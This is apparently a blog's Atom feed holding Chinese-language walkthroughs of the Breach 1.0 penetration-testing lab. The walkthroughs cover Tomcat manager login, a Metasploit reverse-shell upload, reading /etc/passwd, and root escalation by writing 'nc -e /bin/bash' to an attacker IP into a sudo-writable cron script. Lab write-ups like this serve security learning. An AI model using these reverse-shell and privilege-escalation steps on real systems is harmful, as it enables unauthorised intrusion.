<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-09-17T07:31:21.222Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>breach1靶场渗透（二）</title>
    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-09-17T05:05:38.000Z</published>
    <updated>2021-09-17T07:31:21.222Z</updated>
    
    <content type="html"><![CDATA[<p>紧接上一回，看看过滤后的记录，找到一条链接：</p><p><a href="https://imgtu.com/i/4KeOTH"><img src="https://z3.ax1x.com/2021/09/17/4KeOTH.png" alt="4KeOTH.png" /></a></p><p>打开网页看看，并不能正确响应，看到地址栏提示不安全？</p><p><a href="https://imgtu.com/i/4Km8AJ"><img src="https://z3.ax1x.com/2021/09/17/4Km8AJ.png" alt="4Km8AJ.png" /></a></p><p>https为何提示不安全？证书过期了么？</p><p>换个火狐浏览器打开试试看，提示是不安全的连接。可能是浏览器认为证书过期。尝试使用burp做个转发（就是加个burp代理，拦截再放过请求包。）因为burp的证书是受信任的：</p><p><a href="https://imgtu.com/i/4Knhxx"><img src="https://z3.ax1x.com/2021/09/17/4Knhxx.png" alt="4Knhxx.png" /></a></p><p>OK，新的页面，新的希望。一个HTTP basic 验证。回到鲨鱼，往下再看看记录。在第三条找到了basic关键字：</p><p><a href="https://imgtu.com/i/4KuEzq"><img src="https://z3.ax1x.com/2021/09/17/4KuEzq.png" alt="4KuEzq.png" /></a></p><p>尝试解码看看：</p><p><a href="https://imgtu.com/i/4Ku66P"><img src="https://z3.ax1x.com/2021/09/17/4Ku66P.png" alt="4Ku66P.png" /></a></p><p>获取到一组用户密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tomcat:Tt\5D8F(#!*u=G)4m7zB</span><br></pre></td></tr></table></figure><p>登录看看，一个tomcat的后台：</p><p><a href="https://imgtu.com/i/4KKJhj"><img src="https://z3.ax1x.com/2021/09/17/4KKJhj.png" alt="4KKJhj.png" /></a></p><p>看到文件上传的位置：</p><p><a href="https://imgtu.com/i/4KQWTO"><img src="https://z3.ax1x.com/2021/09/17/4KQWTO.png" alt="4KQWTO.png" /></a></p><p>使用msf生成一个反弹shell的马：</p><p><a href="https://imgtu.com/i/4KlsUS"><img src="https://z3.ax1x.com/2021/09/17/4KlsUS.png" alt="4KlsUS.png" /></a></p><p>同时开启监听：</p><p><a href="https://imgtu.com/i/4Kl4bV"><img src="https://z3.ax1x.com/2021/09/17/4Kl4bV.png" alt="4Kl4bV.png" /></a></p><p>将生成好的文件上传并且访问：</p><p><a href="https://imgtu.com/i/4K1VqP"><img src="https://z3.ax1x.com/2021/09/17/4K1VqP.png" alt="4K1VqP.png" /></a></p><p>回到msf看到shell:</p><p><a href="https://imgtu.com/i/4K1Gq0"><img src="https://z3.ax1x.com/2021/09/17/4K1Gq0.png" alt="4K1Gq0.png" /></a></p><p>尝试获取交互shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty. spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4K80D1"><img src="https://z3.ax1x.com/2021/09/17/4K80D1.png" alt="4K80D1.png" /></a></p><p>看看内核版本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a 看到版本是Linux Breach 4.2.0-27-generic</span><br></pre></td></tr></table></figure><p>msf里看看有没有可以利用的漏洞。结果并没有</p><p>那就看看有没有什么敏感文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -a</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name </span><br></pre></td></tr></table></figure><p>读取到/etc/passwd文件：</p><p><a href="https://imgtu.com/i/4KJy1e"><img src="https://z3.ax1x.com/2021/09/17/4KJy1e.png" alt="4KJy1e.png" /></a></p><p>逐级查看目录，在www目录下看到两个文件，打开5446文件，莫名的php文件</p><p><a href="https://imgtu.com/i/4KtcdI"><img src="https://z3.ax1x.com/2021/09/17/4KtcdI.png" alt="4KtcdI.png" /></a></p><p>打开查看，是数据库的账号密码文件，账号是root,密码是空。</p><p><a href="https://imgtu.com/i/4Kt7es"><img src="https://z3.ax1x.com/2021/09/17/4Kt7es.png" alt="4Kt7es.png" /></a></p><p>连接数据库：</p><p><a href="https://imgtu.com/i/4KNZlD"><img src="https://z3.ax1x.com/2021/09/17/4KNZlD.png" alt="4KNZlD.png" /></a></p><p>在user表内找打了账号，密码信息：</p><p><a href="https://imgtu.com/i/4KN4tx"><img src="https://z3.ax1x.com/2021/09/17/4KN4tx.png" alt="4KN4tx.png" /></a></p><p>对milton的密码解密（哈希值）：</p><p><a href="https://imgtu.com/i/4KUsUI"><img src="https://z3.ax1x.com/2021/09/17/4KUsUI.png" alt="4KUsUI.png" /></a></p><p>切换用户：</p><p><a href="https://imgtu.com/i/4KaQRf"><img src="https://z3.ax1x.com/2021/09/17/4KaQRf.png" alt="4KaQRf.png" /></a></p><p>再重复之前的操作，查看文件，看看历史执行，看看能不能root执行什么，结果并没有。在历史命令里我们看到切换到了blubergh账号，但是我们并没有找到他的密码？</p><p>只能回过头去看，慢慢寻找。想起之前目录扫描时的图片目录，把所有的图片下载下来，strings 或者exiftool看看照片有没有注释。</p><p>[<img src="https://z3.ax1x.com/2021/09/17/4KDmCR.png" alt="4KDmCR.png" />](<a href="https://imgtu.com/i/4KDmCR">https://imgtu.com/i/4KDmCR</a></p><p>尝试切换，确实是密码，看看权限：</p><p><a href="https://imgtu.com/i/4KDwKf"><img src="https://z3.ax1x.com/2021/09/17/4KDwKf.png" alt="4KDwKf.png" /></a></p><p>两个文件能以root身份执行，其中tidyup是用来隔一段时间删除tomcat上传的文件用来防止黑客</p><p>另一个文件tee:</p><p><a href="https://imgtu.com/i/4Ky8VU"><img src="https://z3.ax1x.com/2021/09/17/4Ky8VU.png" alt="4Ky8VU.png" /></a></p><p>如此，我们可以利用第一个命令向第二个文件内写入一个定时任务，第二个文件每三分钟执行一次:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;nc -e /bin/bash 192.168.110.129 5555&quot; &gt; shell.txt</span><br><span class="line"></span><br><span class="line">cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure><p>随后我们在msf机器开启监听：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5555</span><br></pre></td></tr></table></figure><p>等待一段时间：</p><p><a href="https://imgtu.com/i/4KgRz9"><img src="https://z3.ax1x.com/2021/09/17/4KgRz9.png" alt="4KgRz9.png" /></a></p><p><a href="https://imgtu.com/i/4K2iWQ"><img src="https://z3.ax1x.com/2021/09/17/4K2iWQ.png" alt="4K2iWQ.png" /></a></p><p>结束。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;紧接上一回，看看过滤后的记录，找到一条链接：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://imgtu.com/i/4KeOTH&quot;&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/09/17/4KeOTH.png&quot; alt=&quot;4KeOTH.png&quot; </summary>
      
    
    
    
    
    <category term="breach 渗透测试" scheme="http://example.com/tags/breach-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>breach1靶场渗透</title>
    <link href="http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2021/09/17/breach1%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2021-09-16T16:25:49.000Z</published>
    <updated>2021-09-16T16:32:09.171Z</updated>
    
    <content type="html"><![CDATA[<h4 id="靶场搭建"><a class="markdownIt-Anchor" href="#靶场搭建"></a> 靶场搭建</h4><p>下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默认将ip设置为192.168.110.140。</p><h4 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试：</h4><p>因为IP已知，首先对靶场进行端口扫描，借助nmap:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-65535 192.168.110.140</span><br></pre></td></tr></table></figure><p>扫描后看到结果，所有的端口都是打开状态，因此判断可能是采用了ips，或者waf防护<a href="https://imgtu.com/i/4uCzCD"><img src="https://z3.ax1x.com/2021/09/16/4uCzCD.png" alt="4uCzCD.png" /></a></p><p>尝试在浏览器中访问靶机IP，看到一些没啥用的信息（讲故事）</p><p><a href="https://imgtu.com/i/4uPYPU"><img src="https://z3.ax1x.com/2021/09/16/4uPYPU.png" alt="4uPYPU.png" /></a></p><p>尝试看看源码？也就这样了。看到一段加密过的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!------Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo -----&gt;</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4uPWMd"><img src="https://z3.ax1x.com/2021/09/16/4uPWMd.png" alt="4uPWMd.png" /></a></p><p>这段值是64位，根据常见的加密算法的特征，猜测是base64加密。 （md5:32位，sha1：40位）尝试用自动解码工具解码看看，果然是base64，但还是看不懂，难道加了盐？再试一次，能看懂了。</p><p><a href="https://imgtu.com/i/4uihpF"><img src="https://z3.ax1x.com/2021/09/16/4uihpF.png" alt="4uihpF.png" /></a></p><p><a href="https://imgtu.com/i/4uiqk6"><img src="https://z3.ax1x.com/2021/09/16/4uiqk6.png" alt="4uiqk6.png" /></a></p><p>解码出现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pgibbons:damnitfeel$goodtobeagang$ta</span><br></pre></td></tr></table></figure><p>猜测是某个用户账号密码</p><p>回到原来的初始页面，点击图片，进入一个类似导航的页面：</p><p><a href="https://imgtu.com/i/4uZLtI"><img src="https://z3.ax1x.com/2021/09/16/4uZLtI.png" alt="4uZLtI.png" /></a></p><p>依次点点看 ，再最后一个链接，进入了一个后台直接看到是什么cms ，后面可以查询看看这个impress cms 有没有什么漏洞</p><p><a href="https://imgtu.com/i/4ue141"><img src="https://z3.ax1x.com/2021/09/16/4ue141.png" alt="4ue141.png" /></a></p><p>用之前的密码试试看？果然进入：</p><p><a href="https://imgtu.com/i/4ueo80"><img src="https://z3.ax1x.com/2021/09/16/4ueo80.png" alt="4ueo80.png" /></a></p><p>先看看cms是不是有什么漏洞。msf打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit  impresscms</span><br></pre></td></tr></table></figure><p>有是有就是不知道这里具体的版本：</p><p><a href="https://imgtu.com/i/4umIdH"><img src="https://z3.ax1x.com/2021/09/16/4umIdH.png" alt="4umIdH.png" /></a></p><p>依次尝试，并不行。。。</p><p>继续看看页面上有啥，这里有三个未读邮件，进去看看</p><p><a href="https://imgtu.com/i/4unAyT"><img src="https://z3.ax1x.com/2021/09/16/4unAyT.png" alt="4unAyT.png" /></a></p><p>第三封邮件有信息，在 192.168.110.140/.keystore 位置保存了文件</p><p><a href="https://imgtu.com/i/4unY0e"><img src="https://z3.ax1x.com/2021/09/16/4unY0e.png" alt="4unY0e.png" /></a></p><p>keystore是keytool（jdk里自带）生成的密钥、证书存储的地方，这里有什么关键的信息？可以用keytool提取java里的密钥、证书。不管别的，先下载这个keystore。但是没有密钥口令也没法解开。</p><p>继续寻找密钥，点点点，在View Account内有个一content链接打开看看？</p><p><a href="https://imgtu.com/i/4uu7xP"><img src="https://z3.ax1x.com/2021/09/16/4uu7xP.png" alt="4uu7xP.png" /></a></p><p><a href="https://imgtu.com/i/4uuzPs"><img src="https://z3.ax1x.com/2021/09/16/4uuzPs.png" alt="4uuzPs.png" /></a></p><p>看看提示，有个文件： <a href="http://192.168.110.140/impresscms/_SSL_test_phase1.pcap%E3%80%82pcap%E6%96%87%E4%BB%B6%EF%BC%9F%E4%BB%80%E4%B9%88%E7%8E%A9%E6%84%8F%EF%BC%9F%E6%90%9C%E6%90%9C%E7%9C%8B%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AFwireshark%E7%9A%84%E6%B5%81%E9%87%8F%E5%8C%85%EF%BC%8C%E4%B8%8B%E4%BA%86%E5%86%8D%E8%AF%B4%E3%80%82%E7%BB%A7%E7%BB%AD%E7%9C%8B%EF%BC%8C%E7%94%9F%E6%88%90keystore%E9%9C%80%E8%A6%81%E7%9A%84%E5%88%AB%E5%90%8D%EF%BC%8C%E5%AF%86%E9%92%A5%E9%83%BD%E6%98%AF%E2%80%9Ctomcat%E2%80%9D%E3%80%82%E5%9C%A8%E4%B8%8B%E8%BD%BDkeystore%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E4%BD%BF%E7%94%A8keytool%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6%EF%BC%9A">http://192.168.110.140/impresscms/_SSL_test_phase1.pcap。pcap文件？什么玩意？搜搜看，原来是wireshark的流量包，下了再说。继续看，生成keystore需要的别名，密钥都是“tomcat”。在下载keystore的目录下，使用keytool生成证书：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -importkeystore -srckeystore E:\Download\keystore -destkeystore E:\Download\\tomcat.p12 -deststoretype PKCS12 -srcalias tomcat</span><br></pre></td></tr></table></figure><p>密钥库口令就是tomcat。可以看到tomcat.p12证书生成。</p><p>打开SSL_test_phase1.pcap文件，https协议，用了TSL加密，因此导入刚刚生成的证书来解密。</p><p>编辑–&gt;首选项–&gt;Protocols–&gt;TLS–&gt;edit</p><p><a href="https://imgtu.com/i/4ulPMt"><img src="https://z3.ax1x.com/2021/09/17/4ulPMt.png" alt="4ulPMt.png" /></a></p><p>回到wireshark主页面，过滤一下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src == 192.168.110.140 || ip.dst == 192.168.110.140 and http</span><br></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/4ulGoF"><img src="https://z3.ax1x.com/2021/09/17/4ulGoF.png" alt="4ulGoF.png" /></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;靶场搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#靶场搭建&quot;&gt;&lt;/a&gt; 靶场搭建&lt;/h4&gt;
&lt;p&gt;下载好breach1.0镜像文件后，创建虚拟机，注意要将虚拟机网段设置成仅主机模式。网段设置为192.168.110.0，虚拟机会默</summary>
      
    
    
    
    
    <category term="breach1.0 渗透测试" scheme="http://example.com/tags/breach1-0-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>myfirstblog</title>
    <link href="http://example.com/2021/09/15/myfirstblog/"/>
    <id>http://example.com/2021/09/15/myfirstblog/</id>
    <published>2021-09-15T12:00:35.000Z</published>
    <updated>2021-09-16T16:21:24.360Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客，分享渗透测试学习的点点滴滴</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客，分享渗透测试学习的点点滴滴&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
